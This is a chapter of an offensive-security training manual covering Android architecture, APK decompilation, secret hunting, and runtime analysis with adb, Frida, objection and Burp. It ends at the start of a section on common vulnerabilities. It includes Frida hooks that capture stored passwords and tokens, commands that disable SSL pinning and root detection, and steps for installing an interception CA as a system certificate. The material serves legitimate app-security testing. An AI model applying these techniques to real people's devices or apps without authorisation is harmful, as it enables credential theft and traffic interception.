# Chapter 21 — Mobile Security: Android Internals & APK Analysis

**VADER-RCE Field Manual**
**Prerequisite**: Ch08 Target Reversing, Ch14 Reverse Engineering, Ch16 C2
**Drill**: DRILLS/21_mobile_security/

---

## Why You Need This

Three billion Android devices. Every one of them is a computer in
someone's pocket. They carry credentials, contacts, location history,
authentication tokens, banking apps, and corporate email. They connect
to corporate WiFi. They sync to cloud services. They run code with
minimal user scrutiny — "allow this app to access contacts" is all the
trust a user grants.

The Android security model is strong in principle. App sandboxing,
mandatory permissions, cryptographic signing. In practice: the platform
has a decade of CVEs, the app ecosystem is full of badly-written software
with classic vulnerabilities, and the gap between the security model
and its actual implementation is where you operate.

This chapter covers Android from the architecture up. You need to understand
the platform before you can exploit it, analyse malware running on it, or
test applications for vulnerabilities.

Two operational contexts:

1. **APK analysis** — static and dynamic analysis of Android apps.
   Find vulnerabilities, understand malware, extract credentials and secrets.

2. **Android exploitation** — runtime instrumentation with Frida, traffic
   interception with Burp, bypass of certificate pinning and root detection.

Both contexts require the same foundational knowledge. Start with the
architecture. Everything else follows from it.

---

## WINDOWS SETUP

This chapter uses four distinct tools. **None of them install cleanly with a single command** — read this section in full before touching the drills. Budget 2–4 hours the first time. Do it once, document what worked.

### Tools Used in This Chapter

| Tool | What it does | Install method |
|------|-------------|----------------|
| apktool | Decodes APK to smali + readable XML | Manual JAR install (see below) |
| jadx / jadx-gui | Decompiles DEX bytecode to Java | Manual ZIP release (see below) |
| adb (Android Debug Bridge) | Shell access to device/emulator | Android Platform Tools ZIP |
| frida-tools | Runtime instrumentation | pip (Python) |
| objection | Frida wrapper with pre-built Android commands | pip (Python) |
| Android Emulator | Virtual Android device for testing | Android Studio install |

---

### Step 1 — Install Java (required by apktool AND jadx)

apktool and jadx are Java programs. Java must be installed and on your PATH before either tool will run. This is the most common tooling wall.

```powershell
# Option A: Install via winget (Windows 11, run as Administrator):
winget install Microsoft.OpenJDK.21

# Option B: Download directly (no winget required):
# https://adoptium.net/temurin/releases/?version=21&os=windows&arch=x64&package=jdk
# Download the .msi installer. Run it. Check "Add to PATH" during install.
```

**Verify Java is on PATH (run in a NEW PowerShell window after install):**
```powershell
java -version
```

**Expected output:**
```
openjdk version "21.0.x" 2024-xx-xx
OpenJDK Runtime Environment ...
```

**Failure looks like: `java is not recognized as an internal or external command` — means Java is not on your PATH. Fix: open System Properties → Environment Variables → Path → Add the Java bin folder (e.g., `C:\Program Files\Eclipse Adoptium\jdk-21.x.x\bin`). Reopen PowerShell.**

> **Admin rights required**: the Adoptium MSI installer requires Administrator.

---

### Step 2 — Install apktool

apktool is not on pip or winget. It is a wrapper script + JAR file that you place manually.

```powershell
# 1. Create a tools directory:
mkdir C:\tools\apktool

# 2. Download the latest apktool JAR:
# https://apktool.org/docs/install/
# Direct link: https://bitbucket.org/iBotPeaches/apktool/downloads/
# Download: apktool_X.X.X.jar  (e.g., apktool_2.9.3.jar)
# Save to: C:\tools\apktool\apktool.jar

# 3. Download the Windows wrapper script:
# https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/windows/apktool.bat
# Save to: C:\tools\apktool\apktool.bat

# 4. Add C:\tools\apktool to PATH:
# System Properties → Environment Variables → Path → New → C:\tools\apktool
```

**Verify:**
```powershell
apktool --version
```

**Expected output:** `Apktool v2.9.x`

**Failure looks like: `Error occurred during initialization of VM` — means Java is missing or wrong version. Fix: verify `java -version` works first.**

---

### Step 3 — Install jadx

jadx is a ZIP release with its own launcher scripts. No PATH juggling required beyond extracting it.

```powershell
# Download latest release ZIP from GitHub:
# https://github.com/skylot/jadx/releases/latest
# File: jadx-X.X.X.zip  (e.g., jadx-1.5.0.zip)
# Extract to: C:\tools\jadx\

# The ZIP contains:
#   bin/jadx.bat       ← CLI decompiler
#   bin/jadx-gui.bat   ← GUI decompiler (use this)
#   lib/               ← all Java deps included

# Add C:\tools\jadx\bin to PATH (same process as apktool above)
```

**Verify:**
```powershell
jadx --version
```

**Expected output:** `jadx-1.5.x`

**Failure looks like: `'jadx' is not recognized` — means the bin folder is not on PATH, or PATH was not refreshed. Fix: close and reopen PowerShell, or run `$env:PATH += ";C:\tools\jadx\bin"` in the current session.**

---

### Step 4 — Install Android Platform Tools (adb)

adb ships as part of Android Platform Tools, a standalone ZIP — no Android Studio needed.

```powershell
# Download Platform Tools:
# https://developer.android.com/tools/releases/platform-tools
# File: platform-tools-latest-windows.zip
# Extract to: C:\tools\platform-tools\

# Add C:\tools\platform-tools to PATH
```

**Verify:**
```powershell
adb version
```

**Expected output:** `Android Debug Bridge version 1.0.41`

**Failure looks like: `adb is not recognized` — PATH not set. Fix: same PATH process as above.**

---

### Step 5 — Install frida-tools and objection (pip)

These are standard Python packages. You already have Python. These are the easiest installs in this chapter.

```powershell
# Install frida-tools:
pip install frida-tools

# Install objection:
pip install objection

# If you have a venv for your tools, activate it first:
# .\venv\Scripts\activate
```

**Verify frida:**
```powershell
frida --version
```

**Expected output:** `16.x.x`

**Verify objection:**
```powershell
objection version
```

**Expected output:** `objection: x.x.x`

**Failure looks like: `No module named 'frida'` after install — means pip installed to a different Python than the one on your PATH. Fix: use `python -m pip install frida-tools` instead of bare `pip`.**

---

### Step 6 — Android Emulator (for the drills)

You need a rooted Android device OR an Android emulator. For the drills, use an emulator.

```powershell
# Install Android Studio (includes the emulator):
# https://developer.android.com/studio
# During setup, install: Android SDK, Android Emulator, Android Virtual Device

# After install, create an AVD (Android Virtual Device):
# Android Studio → More Actions → Virtual Device Manager → Create Device
# Recommended: Pixel 6, API 33 (Android 13), x86_64 image
# For root access: choose a "Google APIs" image, NOT "Google Play"
# (Google Play images block root)
```

> **Admin rights required**: Android Studio installer requires Administrator.

**Verify emulator launches:**
```powershell
# Start the emulator from the AVD manager, then:
adb devices
```

**Expected output:**
```
List of devices attached
emulator-5554   device
```

**Failure looks like: `List of devices attached` with nothing below it — emulator is not running or adb can't see it. Fix: wait 30 seconds for the emulator to boot, then retry.**

---

### WSL2 Note

None of the tools in this chapter strictly require WSL2. All commands in this chapter run in PowerShell or Git Bash on Windows. However, if you want to run Linux-native tools (some Frida scripts, openssl commands for cert manipulation), install WSL2:

```powershell
# Install WSL2 (run as Administrator, requires reboot):
wsl --install
```

The Burp cert manipulation commands in Section 4 that use `openssl` can be run in WSL2 if you do not have openssl on Windows. WSL2 Ubuntu includes openssl by default.

---

## Section 1 — Android Architecture

Android is a modified Linux kernel with an application framework layered
on top. Understanding each layer tells you WHERE vulnerabilities exist and
HOW to reach them.

```
ANDROID ARCHITECTURE STACK:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Layer 5: Applications (APKs)
  ├── Your target app
  ├── Other installed apps
  └── System apps (Settings, Phone, etc.)

Layer 4: Android Application Framework (Java/Kotlin)
  ├── Activity Manager, Window Manager, Package Manager
  ├── Content Providers, View System
  └── Location, Telephony, Notification managers

Layer 3: Android Runtime (ART) + Libraries
  ├── ART / Dalvik (bytecode execution engine)
  ├── WebKit (browser engine)
  ├── OpenSSL/BoringSSL (TLS/crypto)
  └── libc, libm, SQLite

Layer 2: HAL (Hardware Abstraction Layer)
  ├── Camera, Audio, Bluetooth, WiFi drivers
  └── Exposed to framework via JNI

Layer 1: Linux Kernel (modified)
  ├── Process scheduling, memory management
  ├── Binder IPC driver (critical: this is how apps communicate)
  ├── SELinux enforcement
  └── Hardware drivers
```

### Linux Kernel Base

Android runs on a modified Linux kernel. Every Android-specific security
mechanism builds on Linux fundamentals:

- **UIDs**: each installed app gets a unique UID (e.g., app with package
  `com.example.app` gets UID 10042). The kernel enforces file permission
  separation between apps via UIDs. App A cannot read App B's files because
  it doesn't have the right UID.

- **SELinux**: Mandatory Access Control enforcement. Every process, file,
  and socket has an SELinux label. Policy rules define what each label can
  do. Bypassing the app sandbox often requires a SELinux policy violation
  as well as a kernel exploit.

- **Seccomp**: system call filtering. Restricts which syscalls a process
  can make. The browser renderer is a common target for seccomp escapes
  (sandbox breakout in Chrome for Android requires defeating seccomp).

### The UID-Per-App Sandbox Model

This is the core of Android's security model and the thing all exploits
must either work within or escape from.

```
APP SANDBOX MODEL:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

com.example.bankapp  → UID 10042 → /data/data/com.example.bankapp/ (owned by UID 10042)
com.example.malware  → UID 10117 → /data/data/com.example.malware/ (owned by UID 10117)

Malware app CANNOT:
  - Read /data/data/com.example.bankapp/ (wrong UID, permission denied)
  - Send arbitrary Intent to bankapp components (unless they're exported)
  - Access bankapp's SharedPreferences
  - Read bankapp's cookies/tokens

Malware app CAN:
  - Read /sdcard/ (external storage, shared)
  - Send Intents to EXPORTED components of bankapp (if any)
  - Use ACCESSIBILITY SERVICE to read screen content (dangerous permission)
  - Capture clipboard content (read_clipboard permission)
  - If device is ROOTED: everything (root = UID 0, no sandbox)
```

**Exploitation implication**: escaping the sandbox requires either:
1. A kernel vulnerability (privilege escalation to UID 0)
2. A SELinux bypass
3. A vulnerability in a privileged system service (runs as system UID, accessible via IPC)
4. Exploiting exported app components (remains within the sandbox but crosses app boundaries)

### ART / Dalvik Runtime

Android apps are written in Java/Kotlin but don't run on a JVM. They
compile to DEX (Dalvik Executable) bytecode. DEX bytecode runs on the
ART (Android Runtime) or the older Dalvik runtime.

```
COMPILATION CHAIN:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Developer code (Java/Kotlin)
    │
    ▼ javac / kotlinc
Java bytecode (.class files)
    │
    ▼ d8 / dextools
DEX bytecode (.dex files)
    │
    ▼ packaged into
APK (AndroidManifest.xml + classes.dex + resources.arsc + libs)
    │
    ▼ installed on device
ART: AOT compiles DEX to native .oat file
     OR: interprets DEX (Dalvik mode, older devices)
```

**Why this matters for reversing**: you can decompile DEX back to
Java (imperfect but readable). Tools like jadx do this automatically.
The decompiled Java is not the original source — variable names are
lost, but logic is preserved. You can read Android apps without
source code.

### Binder IPC

Android processes don't share memory. Communication between apps (and
between apps and system services) goes through the Binder kernel driver.
Binder is the backbone of the Android framework.

```
BINDER IPC MECHANISM:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

App A wants to call a method on App B's Service:
  1. App A gets a Binder reference to App B's Service (via Intent)
  2. App A marshals the call arguments into a Parcel
  3. App A sends the Parcel to the Binder driver (/dev/binder)
  4. Kernel Binder driver copies the Parcel to App B's process
  5. App B's Service receives the call, executes, marshals response
  6. Response returns the same way

The Binder driver enforces identity: calls include the CALLER UID.
This allows services to check caller permissions:
  if (Binder.getCallingUid() != TRUSTED_UID) throw SecurityException;
```

**Attack surface**: Binder IPC is exposed through Android components
(Activities, Services, Broadcast Receivers, Content Providers). If these
components are exported (accessible to other apps), their Binder interface
is an attack surface. Malformed Parcel data can cause parsing bugs.
Privilege escalation via vulnerable system services uses Binder IPC.

---

## Section 2 — APK Structure

An APK is a ZIP file. Open it with any ZIP tool. Everything inside is
your analysis target.

```
APK CONTENTS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

AndroidManifest.xml    ← BINARY XML. Must be decoded. Primary analysis target.
classes.dex            ← DEX bytecode (all Java/Kotlin code)
classes2.dex           ← additional DEX (if app uses multidex)
resources.arsc         ← compiled resource table (strings, layouts, config)
assets/                ← raw files (JS, HTML, configs, embedded files)
lib/
  armeabi-v7a/         ← native libraries for 32-bit ARM
  arm64-v8a/           ← native libraries for 64-bit ARM (most current devices)
  x86/                 ← 32-bit x86 (emulators)
  x86_64/              ← 64-bit x86 (emulators, some Chromebooks)
res/                   ← resources (icons, layout XMLs, drawables)
META-INF/
  CERT.RSA             ← signing certificate
  CERT.SF              ← signature file
  MANIFEST.MF          ← hash of all files in APK
```

### AndroidManifest.xml — Primary Analysis Target

The manifest declares EVERYTHING the app does and CAN do:
- Package name (unique app identifier)
- Permissions requested
- All components (Activities, Services, BroadcastReceivers, ContentProviders)
- Which components are exported (accessible to other apps)
- Intent filters (what Intents the app handles)
- Minimum and target API level

```bash
# Decode binary AndroidManifest.xml:
# Binary XML cannot be read directly — must decode
# apktool does this automatically during decompile

# Manual decode:
adb backup -noapk com.example.app    # pulls backup, contains manifest
# OR use aapt (Android Asset Packaging Tool):
aapt dump badging app.apk            # dump full app badge info including permissions
aapt dump xmltree app.apk AndroidManifest.xml  # dump manifest as XML tree

# Or decode with apktool (preferred — decodes everything at once):
apktool d app.apk -o output_dir
cat output_dir/AndroidManifest.xml
```

### Expected Output

**Success looks like:**
```
I: Using Apktool 2.9.x on app.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: ...
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```
Then `output_dir/AndroidManifest.xml` exists and is readable plain text.

**Failure looks like: `brut.androlib.AndrolibException: Could not decode arsc file` — means the APK uses a newer resource format than your apktool version. Fix: download the latest apktool JAR. Add `-r` flag to skip resources: `apktool d app.apk -o output_dir -r`**

**Failure looks like: `Exception in thread "main" java.lang.UnsupportedClassVersionError` — means your Java version is too old. Fix: reinstall Java 21+ from Adoptium.**

**What to look for in the manifest:**

```xml
<!-- Dangerous permissions requested: -->
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.READ_CALL_LOG" />
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
<!-- BIND_ACCESSIBILITY_SERVICE is the keylogger permission -->

<!-- Exported components (accessible from other apps — attack surface): -->
<activity android:name=".LoginActivity" android:exported="true">
    <!-- ANY app can start this Activity. If it contains auth bypasses — exploitable -->
</activity>

<service android:name=".SyncService" android:exported="true">
    <!-- ANY app can bind to this service and call its methods -->
</service>

<receiver android:name=".BootReceiver" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED" />
    </intent-filter>
    <!-- Runs on device boot. Persistence mechanism for malware. -->
</receiver>

<provider android:name=".DataProvider"
          android:authorities="com.example.app.provider"
          android:exported="true">
    <!-- ANY app can query this ContentProvider -->
    <!-- Classic bug: no permission check → path traversal → local file read -->
</provider>
```

### DEX Bytecode

DEX is Android's bytecode format. All Java/Kotlin code compiles to DEX.

```
DEX FILE STRUCTURE:
  Header       → magic "dex\n035\0", file size, checksums
  String IDs   → string table (all strings in the app)
  Type IDs     → type references (class names, primitives)
  Proto IDs    → method prototypes (return type + parameter types)
  Field IDs    → field references
  Method IDs   → method references
  Class Defs   → class definitions pointing to methods and fields
  Code Items   → actual bytecode for each method

# DEX is register-based (not stack-based like JVM)
# Each method has a set of virtual registers
# Bytecode operates on these registers
```

You don't need to read raw DEX. jadx decompiles it to Java automatically.

---

## Section 3 — Static Analysis Workflow

Static analysis = read the APK without running it.

### Step 1: Decompile with apktool

apktool decodes the APK to smali (DEX assembly) and decodes binary XML.

```bash
# Decompile the APK:
apktool d target.apk -o output/

# Output structure:
output/
  AndroidManifest.xml    ← decoded, readable
  smali/                 ← DEX as smali assembly
  res/                   ← decoded resources
  assets/                ← raw assets
  original/              ← original META-INF

# Smali is human-readable DEX assembly.
# You normally don't read smali directly — jadx gives you Java.
# Smali matters when you need to MODIFY the APK (patch a method, bypass a check).
.method public onCreate(Landroid/os/Bundle;)V  # method signature: returns void (V)
    .registers 3                               # this method uses 3 registers (p0=this, p1=Bundle arg, v0=scratch)
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V  # call super.onCreate(savedInstanceState)
    const/high16 v0, 0x7f040000               # load layout resource ID into v0
    invoke-virtual {p0, v0}, Lcom/example/app/MainActivity;->setContentView(I)V    # call this.setContentView(v0)
    return-void                               # method returns, no value
.end method
```

### Expected Output

**Success looks like:**
```
I: Using Apktool 2.9.x on target.apk
I: Baksmaling classes.dex...
I: Copying assets and libs...
```
The `output/` directory is created and `output/AndroidManifest.xml` is readable plain text.

**Failure looks like: `brut.common.BrutException: could not exec` — means apktool.bat is missing or Java is not on PATH. Fix: verify `java -version` in the SAME PowerShell window.**

### Step 2: Decompile to Java with jadx

jadx takes the APK (or .dex file) and decompiles it to approximate Java.
Much more readable than smali.

```bash
# GUI (recommended for navigation):
jadx-gui target.apk

# CLI (for scripted analysis — outputs Java source files):
jadx -d output_java/ target.apk

# Output: Java source files under output_java/sources/
# Navigate the package structure in jadx-gui
# Use Ctrl+F to search for strings, class names, method calls
```

### Expected Output

**Success looks like:**
jadx-gui opens a window. Left panel shows the package tree (e.g., `com.example.app`). Clicking any class shows decompiled Java in the right panel.

CLI success: `output_java/sources/com/example/app/MainActivity.java` exists and contains readable Java.

**Failure looks like: `ERROR - 'null' top level class` on many classes — means heavy obfuscation. Fix: the code is still there but class/method names are `a`, `b`, `c`. Use string search to find interesting code by what it says, not what it's named.**

**Failure looks like: jadx-gui shows a blank window or crashes immediately — means Java heap is too small for a large APK. Fix: edit `jadx-gui.bat`, change `-Xmx1g` to `-Xmx4g`.**

**jadx-gui workflow:**
1. Open APK
2. Wait for decompilation
3. Expand package tree (left panel)
4. Navigate to main classes (look for `MainActivity`, `Application`)
5. Use Text Search (Ctrl+Shift+F) to hunt for:
   - `SharedPreferences` — credential storage
   - `http://` — hardcoded URLs
   - `password`, `secret`, `key`, `token` — hardcoded credentials
   - `getExternalStorage`, `Environment.getExternalStorage` — SD card writes
   - `setJavaScriptEnabled` — WebView JS (leads to XSS/JavascriptInterface bugs)

### Step 3: Manifest Permission Audit

After decompilation, review AndroidManifest.xml:

```bash
# Extract and analyse exported components:
cat output/AndroidManifest.xml | grep -i 'exported="true"'
cat output/AndroidManifest.xml | grep -i 'uses-permission'

# List all exported Activities:
grep -A2 'exported="true"' output/AndroidManifest.xml | grep 'activity'

# List dangerous permissions:
grep -E "READ_SMS|RECORD_AUDIO|ACCESS_FINE_LOCATION|BIND_ACCESSIBILITY|READ_CALL_LOG" output/AndroidManifest.xml
```

### Expected Output

**Success looks like:** Lines from the manifest file printed to terminal. Even if grep finds nothing, it exits silently — that means no exported components or no dangerous permissions (good for the target, less interesting for you).

**Failure looks like: `No such file or directory: output/AndroidManifest.xml` — apktool step failed or you are running the command from the wrong directory. Fix: run `ls output/` to confirm the file exists.**

### Step 4: Hardcoded Secrets Hunt

```bash
# In decompiled Java (jadx output):
# -r = recursive, -i = case insensitive, searching for credential-related strings
grep -r "password\|passwd\|secret\|apikey\|api_key\|token\|bearer" output_java/ -i

# Find hardcoded URLs (exclude schema/W3C URLs which are framework boilerplate):
grep -r "http://\|https://" output_java/ | grep -v "//schemas\|//www.w3.org\|//android"

# In assets/ (common for React Native, Flutter, Cordova apps — JS bundles live here):
find output/assets -name "*.js" | xargs grep -i "password\|secret\|apikey\|http://"
find output/assets -name "*.json" | xargs grep -i "key\|secret\|token\|url"

# In resources:
grep -r "key\|secret\|password\|token" output/res/ -i

# In native libraries (requires strings tool — extracts printable strings from binary):
find output/lib -name "*.so" | xargs strings | grep -iE "http://|password|secret|key="
```

### Expected Output

**Success looks like:**
```
output_java/sources/com/example/app/Config.java:    private static final String API_KEY = "AIzaSy...";
output_java/sources/com/example/app/NetworkManager.java:    String url = "http://api.example.com/v1/login";
```

**Failure looks like:** No output — either no hardcoded secrets (unlikely for a vulnerable sample app) or the strings are obfuscated/encrypted. Fix: search for the decryption function instead — look for `decrypt`, `deobfuscate`, `AES`, `Base64.decode`.**

### Step 5: Exported Component Enumeration

For each exported component, determine:
1. What Intents does it accept?
2. Does it perform any checks on the caller?
3. Does it expose sensitive functionality?

```java
// In jadx: find exported Activity example
// Decompiled code:
public class DeepLinkActivity extends AppCompatActivity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Uri data = getIntent().getData();   // get the URI from the Intent that started this Activity
        // BUG: no validation of 'data' URI — attacker controls this value entirely
        String url = data.toString();
        webView.loadUrl(url);   // loads attacker-supplied URL in the app's WebView context
        // → deeplink injection: if WebView has JavascriptInterface = RCE
        // → if WebView has file:// access enabled = local file read
    }
}

// This Activity accepts any deeplink and loads it in a WebView
// If the WebView has JavascriptInterface: RCE
// If the WebView has file:// access: local file read
```

---

## Section 4 — Dynamic Analysis

Static analysis tells you what the code can do. Dynamic analysis tells
you what it DOES when you poke it.

### adb Command Reference

adb (Android Debug Bridge) is your primary interface to a connected
device or emulator.

```bash
# Connect to device:
adb devices                    # list connected devices
adb connect 192.168.1.100:5555 # connect over network (emulator or WiFi debug)
adb -s <device_id> shell        # connect to specific device if multiple connected

# App management:
adb install app.apk            # install APK
adb install -r app.apk         # reinstall (keep data)
adb uninstall com.example.app  # uninstall
adb shell pm list packages     # list all installed packages
adb shell pm list packages -3  # third-party apps only

# File transfer:
adb push local_file /sdcard/   # push file to device
adb pull /sdcard/file ./       # pull file from device
adb pull /data/data/com.example.app/shared_prefs/ ./  # pull app data (requires root)

# Logcat (app logs):
adb logcat                               # all logs
adb logcat -s "com.example.app"         # filter to specific app
adb logcat | grep -i "password\|token\|secret\|error"

# App info:
adb shell dumpsys package com.example.app   # package info, permissions, activities
adb shell am start -n com.example.app/.MainActivity  # start specific activity

# Send Intent to exported component:
adb shell am start -a android.intent.action.VIEW -d "myapp://callback?token=STOLEN" com.example.app
adb shell am startservice -n com.example.app/.BackgroundService
adb shell am broadcast -a com.example.app.ACTION_EXPORT_DATA

# Screen capture:
adb shell screencap /sdcard/screen.png
adb pull /sdcard/screen.png
```

### Expected Output

**`adb devices` success looks like:**
```
List of devices attached
emulator-5554   device
```

**Failure looks like: `emulator-5554   offline` — emulator is still booting. Wait 30–60 seconds, retry.**

**Failure looks like: `adb: command not found` — Platform Tools not on PATH. Fix: see Windows Setup section.**

**`adb install app.apk` success looks like:**
```
Performing Streamed Install
Success
```

**Failure looks like: `INSTALL_FAILED_NO_MATCHING_ABIS` — the APK's native libs don't match your emulator architecture. Fix: create an x86_64 emulator AVD, or download the x86_64 APK variant.**

### Frida: Dynamic Instrumentation

Frida is the best tool for Android runtime analysis. It lets you inject
JavaScript into any running process, hook methods, modify return values,
bypass checks, and dump memory — all at runtime.

```bash
# Install Frida tooling:
pip install frida-tools

# Download frida-server for target architecture:
# https://github.com/frida/frida/releases
# For the x86_64 emulator, download: frida-server-XX.X.X-android-x86_64.xz
# For a real ARM64 phone, download:  frida-server-XX.X.X-android-arm64.xz
# IMPORTANT: frida-server version MUST match your frida-tools version
#   Check with: frida --version
#   Download matching server from: https://github.com/frida/frida/releases

# Extract the .xz file (use 7-Zip on Windows, or WSL2: xz -d file.xz)

# Push and start frida-server on device (requires root):
adb push frida-server /data/local/tmp/       # copy server binary to device
adb shell chmod 755 /data/local/tmp/frida-server  # make it executable
adb shell /data/local/tmp/frida-server &     # start it in the background

# Verify connection:
frida-ps -U    # list processes on USB-connected device

# Attach to running app:
frida -U -p <pid> -l hook_script.js          # attach by process ID
frida -U -n "com.example.app" -l hook_script.js  # attach by package name

# Spawn (restart app with Frida attached from launch):
frida -U -f com.example.app -l hook_script.js --no-pause
```

### Expected Output

**`frida-ps -U` success looks like:**
```
  PID  Name
-----  -------------------------------------------------------
  123  com.example.app
  456  com.android.systemui
  ...
```

**Failure looks like: `Failed to enumerate processes: unable to connect to remote frida-server` — frida-server is not running on the device. Fix: run `adb shell /data/local/tmp/frida-server &` again, verify with `adb shell ps | grep frida`.**

**Failure looks like: `Unable to connect to remote frida-server: version mismatch` — your frida-tools version and frida-server version differ. Fix: download the exact matching frida-server version from GitHub releases.**

**Basic Frida hook — intercept a method:**

```javascript
// hook_basic.js — log all calls to Activity.onCreate
Java.perform(function() {                    // wait for the Java VM to be ready
    var Activity = Java.use("android.app.Activity");  // get a handle to the Activity class
    
    // Replace onCreate with our wrapper (overload specifies the exact method signature):
    Activity.onCreate.overload("android.os.Bundle").implementation = function(savedInstanceState) {
        console.log("[+] Activity.onCreate called");
        console.log("    Class: " + this.$className);  // log which Activity subclass this is
        // Call original implementation (skipping this would break the app):
        this.onCreate(savedInstanceState);
    };
});
```

### Expected Output

**Success looks like** (in the frida terminal when navigating the app):
```
[+] Activity.onCreate called
    Class: com.example.app.MainActivity
[+] Activity.onCreate called
    Class: com.example.app.LoginActivity
```

**Failure looks like: `Error: java.lang.ClassNotFoundException: android.app.Activity` — wrong class path. Fix: use jadx to find the exact class name including package.**

**Hook to extract credentials from SharedPreferences:**

```javascript
// hook_sharedprefs.js — capture credentials stored in SharedPreferences
Java.perform(function() {
    // SharedPreferencesImpl is the concrete implementation of SharedPreferences
    var SharedPreferences = Java.use("android.app.SharedPreferencesImpl");
    
    // Hook getString — called every time the app reads a string value from prefs
    SharedPreferences.getString.overload("java.lang.String", "java.lang.String")
        .implementation = function(key, defValue) {
            var result = this.getString(key, defValue);  // call original, get the real value
            // Only log keys that look like credentials (reduce noise):
            if (key.toLowerCase().includes("password") ||
                key.toLowerCase().includes("token") ||
                key.toLowerCase().includes("secret")) {
                console.log("[CREDENTIAL] Key: " + key + " = " + result);
            }
            return result;  // return original value — app behaves normally
        };
});
```

### Expected Output

**Success looks like** (when the app reads credentials):
```
[CREDENTIAL] Key: auth_token = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
[CREDENTIAL] Key: password = hunter2
```

**Failure looks like: no output even after logging in — the app may use a different storage mechanism (SQLite, EncryptedSharedPreferences, Keystore). Fix: hook SQLiteDatabase.rawQuery and Cipher.doFinal instead.**

**Hook to dump network traffic (before encryption):**

```javascript
// hook_http.js — intercept OkHttp requests
Java.perform(function() {
    var OkHttpClient = Java.use("okhttp3.OkHttpClient");  // OkHttp is the most common HTTP lib
    var Request = Java.use("okhttp3.Request");
    
    // Hook the intercept chain to log all requests:
    var Interceptor = Java.use("okhttp3.Interceptor");
    // (More complex — see full OkHttp hook in drill files)
    
    // Quick alternative — hook URL.openConnection (catches older HttpURLConnection):
    var URL = Java.use("java.net.URL");
    URL.openConnection.overload().implementation = function() {
        console.log("[HTTP] URL opened: " + this.toString());  // log every URL before connection
        return this.openConnection();  // proceed with original connection
    };
});
```

### Objection: Runtime Analysis Framework

Objection wraps Frida with pre-built commands for common Android analysis
tasks. Faster for standard operations.

```bash
# Install:
pip install objection

# Launch (spawns app with Frida instrumentation):
objection -g com.example.app explore

# Inside objection REPL:
# List Activities:
android hooking list activities

# List Services:
android hooking list services

# Disable root detection:
android root disable

# Disable SSL pinning (universal bypass):
android sslpinning disable

# Dump SharedPreferences:
android preferences dump

# List SQLite databases:
android sqlite list

# Watch method calls:
android hooking watch class com.example.app.LoginManager
android hooking watch method com.example.app.LoginManager.authenticate

# Search for string in heap:
memory search --string "password"
memory dump all /tmp/heap.bin
```

### Expected Output

**`objection -g com.example.app explore` success looks like:**
```
     _     _         _   _
 ___| |_  |_|___ ___| |_|_|___ ___
| . | . | | | -_|  _|  _| | . |   |
|___|___|_| |___|___|_|_| |___|_|_|
          |___|(object)inject(ion)

     Runtime Mobile Exploration
        by: @leonjza from @nowsecure

[tab] for command suggestions

com.example.app on (Android: 13) [usb] #
```

**Failure looks like: `Unable to find target package com.example.app` — app is not installed or package name is wrong. Fix: verify with `adb shell pm list packages | grep example`.**

### Burp Suite Proxy with Android

To intercept HTTPS traffic from Android apps, you need to:
1. Set up Burp as the proxy
2. Install Burp's CA cert on the device
3. Bypass certificate pinning (if the app implements it)

```
PROXY SETUP:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. In Burp: Proxy → Options → Add Listener → 0.0.0.0:8080
   (or use existing 127.0.0.1:8080, change to 0.0.0.0)

2. On device: Settings → WiFi → Long press current network
   → Modify → Advanced → Proxy → Manual
   → Proxy Host: <your_machine_IP>
   → Proxy Port: 8080

3. Install Burp cert:
   # Export: Burp → Proxy → Options → CA Certificate → Export → DER format
   # Push to device:
   adb push burp_cert.der /sdcard/burp_cert.cer
   # Install: Settings → Security → Install from storage → select burp_cert.cer

4. For Android 7.0+ (API 24+):
   # User-installed certs are NOT trusted by default for apps targeting API 24+
   # Must either:
   #   a) Use network_security_config.xml trick (if modifying app)
   #   b) Bypass cert pinning at runtime (Frida/objection)
   #   c) Install cert as SYSTEM cert (requires root)

# Install as system cert (rooted device / emulator with Google APIs image):
openssl x509 -inform DER -in burp_cert.der -out burp_cert.pem  # convert DER to PEM format
CERT_HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp_cert.pem | head -1)  # compute legacy hash (Android uses this for filenames)
cp burp_cert.pem ${CERT_HASH}.0  # rename to the hash-based filename Android expects
adb root             # restart adb as root (only works on rooted/debug builds)
adb remount          # remount /system as read-write
adb push ${CERT_HASH}.0 /system/etc/security/cacerts/  # install as system-trusted CA
adb shell chmod 644 /system/etc/security/cacerts/${CERT_HASH}.0  # set correct permissions
adb reboot           # reboot for the cert to take effect
```

### Expected Output

**Success looks like:** After device reboot, open the browser on the device and navigate to `http://burp/`. If Burp intercepts the request, the proxy is working. In Burp's HTTP history, you will see requests from the Android device.

**Failure looks like:** Burp history is empty despite the app making requests — the app is using certificate pinning. Fix: proceed to Section 6 (SSL Pinning Bypass).

**Failure looks like: `error: device offline` after `adb root` — your emulator image does not support root. Fix: create a new AVD using a "Google APIs" image (NOT "Google Play Store" image).**

---

## Section 5 — Common Android Vulnerabilities

### Exported Activities — Auth Bypass

```
